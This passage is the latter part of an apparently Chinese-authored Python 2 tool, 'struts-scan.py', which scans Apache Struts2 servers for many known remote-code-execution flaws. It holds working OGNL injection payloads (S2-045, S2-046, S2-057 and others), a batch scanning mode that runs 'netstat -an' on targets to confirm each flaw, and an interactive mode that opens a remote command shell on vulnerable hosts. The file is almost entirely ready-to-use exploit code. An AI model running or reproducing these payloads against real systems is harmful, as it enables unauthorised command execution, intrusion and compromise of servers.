utStream%28%29%29%29%7D''',
                "struts2-057-1":'''/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D''',
                "struts2-057-2":'''/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D''',
                }

    def check(self, pocname, vulnstr):
        if vulnstr.find("Active Internet connections") is not -1:
            cprint("目标存在" + pocname + "漏洞..[Linux]", "red")
            filecontent.writelines(pocname+" success!!!"+"\n")
        elif vulnstr.find("Active Connections") is not -1:
            cprint("目标存在" + pocname + "漏洞..[Windows]", "red")
            filecontent.writelines(pocname+" success!!!"+"\n")
        elif vulnstr.find("活动连接") is not -1:
            cprint("目标存在" + pocname + "漏洞..[Windows]", "red")
            filecontent.writelines(pocname+" success!!!"+"\n")
        elif vulnstr.find("LISTEN") is not -1:
            cprint("目标存在" + pocname + "漏洞..[未知OS]", "red")
            filecontent.writelines(pocname+" success!!!"+"\n")
        else:
            cprint("目标不存在" + pocname +"漏洞..", "green")

    def scan(self):
        cprint('''
 ____  _              _            ____                  
/ ___|| |_ _ __ _   _| |_ ___     / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __|____\___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \_____|__) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/    |____/ \___\__,_|_| |_|
                                        Code by Lucifer.
            ''', 'cyan')
        cprint("-------检测struts2漏洞--------\n目标url:"+self.url, "cyan")
        filecontent.writelines("检测struts2漏洞: "+self.url)
        filecontent.write("\n")
        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-005'], timeout=TMOUT, verify=False)
            self.check("struts2-005", req.text)
        except Exception as e:
            cprint("检测struts2-005超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.get(self.url+self.poc['ST2-008-1'], headers=headers,  timeout=TMOUT, verify=False)
            self.check("struts2-008-1", req.text)
        except Exception as e:
            cprint("检测struts2-008-1超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.get(self.url+self.poc['ST2-008-2'], headers=headers,  timeout=TMOUT, verify=False)
            self.check("struts2-008-2", req.text)
        except Exception as e:
            cprint("检测struts2-008-2超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-009'], timeout=TMOUT, verify=False)
            self.check("struts2-009", req.text)
        except Exception as e:
            cprint("检测struts2-009超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-013'], timeout=TMOUT, verify=False)
            self.check("struts2-013", req.text)
        except Exception as e:
            cprint("检测struts2-013超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-016'], timeout=TMOUT, verify=False)
            self.check("struts2-016", req.text)
        except Exception as e:
            cprint("检测struts2-016超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-019'], timeout=TMOUT, verify=False)
            self.check("struts2-019", req.text)
        except Exception as e:
            cprint("检测struts2-019超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.get(self.url+self.poc['ST2-devmode'], headers=headers, timeout=TMOUT, verify=False)
            self.check("struts2-devmode", req.text)
        except Exception as e:
            cprint("检测struts2-devmode超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.get(self.url+self.poc['ST2-032'], headers=headers, timeout=TMOUT, verify=False)
            self.check("struts2-032", req.text)
        except Exception as e:
            cprint("检测struts2-032超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.get(self.url+self.poc['ST2-033'], headers=headers, timeout=TMOUT, verify=False)
            self.check("struts2-033", req.text)
        except Exception as e:
            cprint("检测struts2-033超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.get(self.url+self.poc['ST2-037'], headers=headers, timeout=TMOUT, verify=False)
            self.check("struts2-037", req.text)
        except Exception as e:
            cprint("检测struts2-037超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.get(self.url, headers=headers2, timeout=TMOUT, verify=False)
            self.check("struts2-045", req.text)
        except Exception as e:
            cprint("检测struts2-045超时..", "cyan")
            print "超时原因: ", e

        try:
            uploadexp = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x000"
            files ={"test":(uploadexp, "text/plain")}
            req = requests.post(self.url, files=files, timeout=TMOUT, verify=False)
            self.check("struts2-046", req.text)
        except Exception as e:
            cprint("检测struts2-046超时..", "cyan")
            print "超时原因: ", e

        try:
            vulnurl = urlparse(self.url)[0] + "://" + urlparse(self.url)[1] + "/struts2-showcase/integration/saveGangster.action"
            postdata = {
                "name":self.poc['ST2-048'],
                "age":"1",
                "__checkbox_bustedBefore":"true",
                "description":"1",
            }
            req = requests.post(vulnurl, data=postdata, headers=headers, timeout=TMOUT, verify=False)
            self.check("struts2-048", req.text)
        except Exception as e:
            cprint("检测struts2-048超时..", "cyan")
            print "超时原因: ", e

        try:
            req1 = requests.get(self.url+"?class[%27classLoader%27][%27jarPath%27]=1", headers=headers, timeout=TMOUT, verify=False)
            req2 = requests.get(self.url+"?class[%27classLoader%27][%27resources%27]=1", headers=headers, timeout=TMOUT, verify=False)
            if req1.status_code == 200 and req2.status_code == 404:
                cprint("目标存在struts2-020漏洞..(只提供检测)", "red")
                filecontent.writelines("struts2-020 success!!!\n")
            else:
                cprint("目标不存在struts2-020漏洞..", "green")
        except Exception as e:
            cprint("检测struts2-020超时..", "cyan")
            print "超时原因: ", e

        try:
            req = requests.post(self.url, data=self.poc['ST2-052'], headers=headers_052, timeout=TMOUT, verify=False)
            if req.status_code == 500 and r"java.security.Provider$Service" in req.text:
                cprint("目标存在struts2-052漏洞..(参考metasploit中的struts2_rest_xstream模块)", "red")
                filecontent.writelines("struts2-052 success!!!\n")
            else:
                cprint("目标不存在struts2-052漏洞..", "green")
        except Exception as e:
            cprint("检测struts2-052超时..", "cyan")
            print "超时原因: ", e

        try:
            params = [
                "id",
                "name",
                "filename",
                "username",
                "password",
            ]
            for param in params:
                vulnurl = self.url + "?" + param + "=" + self.poc['ST2-053']
                req = requests.get(vulnurl, headers=headers, timeout=TMOUT, verify=False)
                tips = "检测struts2-053 post参数: " + param
                cprint(tips)
                self.check("struts2-053", req.text)
        except Exception as e:
            cprint("检测struts2-053超时..", "cyan")
            print "超时原因: ", e

        try:
            surl = self.url[self.url.rfind('/')::]
            rurl = self.url.replace(surl, "") + self.poc["struts2-057-1"] + surl
            req = requests.get(rurl, timeout=TMOUT, verify=False, allow_redirects=True)
            self.check("struts2-057-1", req.text)
        except Exception as e:
            cprint("检测struts2-057-01超时..", "cyan")
            print "超时原因: ", e

        try:
            surl = self.url[self.url.rfind('/')::]
            rurl = self.url.replace(surl, "") + self.poc["struts2-057-2"] + surl
            req = requests.get(rurl, timeout=TMOUT, verify=False, allow_redirects=True)
            self.check("struts2-057-2", req.text)
        except Exception as e:
            cprint("检测struts2-057-2超时..", "cyan")
            print "超时原因: ", e


    def inShell(self, pocname):
        cprint('''
 ____  _              _            ____                  
/ ___|| |_ _ __ _   _| |_ ___     / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __|____\___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \_____|__) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/    |____/ \___\__,_|_| |_|
                                        Code by Lucifer.
            ''', 'cyan')
        cprint("-------struts2 交互式shell--------\n目标url:"+self.url, "cyan")
        prompt = "shell >>"

        if pocname == "struts2-005":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        commurl = self.url
                        req = requests.post(commurl, data=self.shell['struts2-005'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-008-1":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        commurl = self.url
                        req = requests.get(commurl+self.shell['struts2-008-1'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-008-2":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        commurl = self.url
                        req = requests.get(commurl+self.shell['struts2-008-2'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-009":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        commurl = self.url
                        req = requests.post(commurl, data=self.shell['struts2-009'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-013":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        commurl = self.url
                        req = requests.post(commurl, data=self.shell['struts2-013'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-016":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        commurl = self.url
                        req = requests.post(commurl, data=self.shell['struts2-016'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-019":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        command = re.sub(r"\s{2,}", " ", command).replace(" ", "','")
                        req = requests.post(self.url, data=self.shell['struts2-019'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-devmode":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        commurl = self.url+self.shell['struts2-devmode'].replace("FUZZINGCOMMAND", command)
                        req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-032":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        commurl = self.url+self.shell['struts2-032'].replace("FUZZINGCOMMAND", command)
                        req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-033":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        commurl = self.url+self.shell['struts2-033'].replace("FUZZINGCOMMAND", command)
                        req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-037":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        commurl = self.url+self.shell['struts2-037'].replace("FUZZINGCOMMAND", command)
                        req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-045":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    headers_exp = {
                         "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                         "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
                         "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                         }
                    try:
                        req = requests.get(self.url, headers=headers_exp, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-046":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        uploadexp = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x000"
                        files ={"test":(uploadexp, "text/plain")}
                        req = requests.post(self.url, files=files, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-048":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        vulnurl = urlparse(self.url)[0] + "://" + urlparse(self.url)[1] + "/struts2-showcase/integration/saveGangster.action"
                        postdata = {
                            "name":self.shell['struts2-048'].replace("FUZZINGCOMMAND", command),
                            "age":"1",
                            "__checkbox_bustedBefore":"true",
                            "description":"1",
                        }
                        req = requests.post(vulnurl, data=postdata, headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-053":
            param = raw_input("请指定struts2-053参数: ")
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        vulnurl = self.url + "?" + param + "=" + self.shell['struts2-053'].replace("FUZZINGCOMMAND", command)
                        req = requests.get(vulnurl, headers=headers, timeout=TMOUT, verify=False)
                        pattern = r'81dc9bdb52d04dc2([\s\S]*)0036dbd8313ed055'
                        m = re.search(pattern,req.text)
                        if m:
                            print m.group(1).strip()
                        print "\n"
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-057-1":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        surl = self.url[self.url.rfind('/')::]
                        rurl = self.url.replace(surl, "") + self.shell["struts2-057-1"].replace("FUZZINGCOMMAND", command) + surl
                        req = requests.get(rurl, headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

        if pocname == "struts2-057-2":
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                if command != "exit":
                    try:
                        surl = self.url[self.url.rfind('/')::]
                        rurl = self.url.replace(surl, "") + self.shell["struts2-057-2"].replace("FUZZINGCOMMAND", command) + surl
                        req = requests.get(rurl, headers=headers, timeout=TMOUT, verify=False)
                        print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                else:
                    sys.exit(1)

if __name__ == "__main__":
    filecontent = open("success.txt", "a+")
    try:
        if sys.argv[1] == "-f":
            with open(sys.argv[2]) as f:
                for line in f.readlines():
                    line = line.strip()
                    strutsVuln = struts_baseverify(line)
                    strutsVuln.scan()
        elif sys.argv[1] == "-u" and sys.argv[3] == "-i":
            strutsVuln = struts_baseverify(sys.argv[2].strip())
            strutsVuln.inShell(sys.argv[4].strip())
        else:
            strutsVuln = struts_baseverify(sys.argv[1].strip())
            strutsVuln.scan()
    except Exception as e:
        figlet = '''
 ____  _              _            ____                  
/ ___|| |_ _ __ _   _| |_ ___     / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __|____\___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \_____|__) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/    |____/ \___\__,_|_| |_|
                                        Code by Lucifer.
        '''
        cprint(figlet,'cyan')
        print "Usage: python struts-scan.py http://example.com/index.action  检测"
        print "       python struts-scan.py -u http://example.com/index.action -i struts2-045 进入指定漏洞交互式shell"
        print "       python struts-scan.py -f url.txt  批量检测"
